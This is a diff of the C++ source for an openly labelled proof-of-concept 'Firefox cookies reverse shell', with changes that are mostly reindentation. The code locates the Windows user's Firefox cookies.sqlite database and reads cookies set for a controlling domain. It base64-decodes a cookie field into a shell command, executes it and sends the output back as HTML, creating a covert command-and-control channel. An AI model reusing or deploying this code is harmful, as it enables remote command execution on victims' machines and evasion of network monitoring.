@@ -3,9 +3,7 @@ Firefox's cookies reverse shell - PoC version - THis is Server!
 
 Coded by CoolerVoid - 17/12/2017
 
-To  compile:
-	c++ -o test test.cpp utils.cpp sqlite.o
-	
+read docs	
 	
 */
 #include "utils.h"
@@ -107,9 +105,9 @@ std::string base64_decode(std::string const& encoded_string)
 std::string readfile(const std::string &filepath)
 {
 	std::string buffer;
-    std::ifstream fin(filepath.c_str());
-    getline(fin, buffer, char(-1));
-    fin.close();
+	std::ifstream fin(filepath.c_str());
+	getline(fin, buffer, char(-1));
+	fin.close();
 	
 	return buffer;
 } 
@@ -127,36 +125,36 @@ std::string exec_command(std::string cmd)
 std::string get_windows_username()
 {
 	char acUserName[128];
-    string UserName;
-    DWORD nUserName = sizeof(acUserName);
+    	string UserName;
+    	DWORD nUserName = sizeof(acUserName);
 	
-    if(GetUserName(acUserName, &nUserName)) 
+    	if(GetUserName(acUserName, &nUserName)) 
 	{
-        UserName = acUserName;
-        return UserName;
-    }
+        	UserName = acUserName;
+        	return UserName;
+    	}
 	return "error";
 } 
  
 std::string get_default_firefox_profiledir(const std::string& name)
 {
-    std::string pattern(name);
-    pattern.append("\\*");
-    WIN32_FIND_DATA data;
-    HANDLE hFind;
+	std::string pattern(name);
+	pattern.append("\\*");
+	WIN32_FIND_DATA data;
+    	HANDLE hFind;
 	
-    if((hFind = FindFirstFile(pattern.c_str(), &data)) != INVALID_HANDLE_VALUE) 
+    	if((hFind = FindFirstFile(pattern.c_str(), &data)) != INVALID_HANDLE_VALUE) 
 	{
-        do {
+        	do {
 			std::string test=data.cFileName;
 
-            if(test.find("default")!=string::npos)
+            		if(test.find("default")!=string::npos)
 				return test;
 
 		} while (FindNextFile(hFind, &data) != 0);
 		
-        FindClose(hFind);
-    }
+        	FindClose(hFind);
+    	}
 	return "Error";
 }
 
@@ -166,7 +164,7 @@ std::string get_firefox_sqlite_path()
 	std::string path="C:\\Users\\"+user+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
 	std::string database_dir=get_default_firefox_profiledir(path);
 	std::string database_path;
-    database_path=path+database_dir+"\\cookies.sqlite";	
+    	database_path=path+database_dir+"\\cookies.sqlite";	
 
 	return database_path;
 }
@@ -184,10 +182,10 @@ void write_cmd_cookie()
 
 void Write_File(std::string filename, std::string buf) 
 {
-  ofstream myfile;
-  myfile.open (filename);
-  myfile << buf;
-  myfile.close();
+	ofstream myfile;
+  	myfile.open (filename);
+  	myfile << buf;
+  	myfile.close();
 }
 
 void construct_html(std::string result_cmd,  std::string filename)
@@ -210,22 +208,23 @@ void send_result_cmd(std::string html_file)
 }
 
 
-static int callback(void *data, int argc, char **argv, char **azColName){
-   int i=0;
+static int callback(void *data, int argc, char **argv, char **azColName)
+{
+   	int i=0;
    
-   while(i<argc)
-   {
-	  if(i==4) 
-	  {
+   	while(i<argc)
+   	{
+		if(i==4) 
+	  	{
 			std::string command=base64_decode(argv[i]);
 			std::string  result_cmd=exec_command(command);
 			construct_html(result_cmd,  "output.html");
 			send_result_cmd("output.html");
-	  }
-	  i++;
-   }
+	  	}
+	  	i++;
+   	}
    
-   return 0;
+   	return 0;
 }
 
 void start_cookie_tunnel()
@@ -235,24 +234,25 @@ void start_cookie_tunnel()
 	std::string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
 	std::string tmp = get_firefox_sqlite_path();
 	sqlite3 *db;
-    char *zErrMsg = 0;
-    int rc;
+    	char *zErrMsg = 0;
+    	int rc;
 	
-    rc = sqlite3_open(tmp.c_str(), &db);
+    	rc = sqlite3_open(tmp.c_str(), &db);
 	
-    if(rc)
+    	if(rc)
 	{
-      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
-      sqlite3_close(db);
-      exit(0);
-    }
-    rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
+      		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+      		sqlite3_close(db);
+      		exit(0);
+    	}
+
+    	rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
 	
-    if(rc!=SQLITE_OK)
+    	if(rc!=SQLITE_OK)
 	{
 		fprintf(stderr, "SQL error: %s\n", zErrMsg);
 		sqlite3_free(zErrMsg);
-    }
+    	}
 	
-    sqlite3_close(db);
+    	sqlite3_close(db);
 }
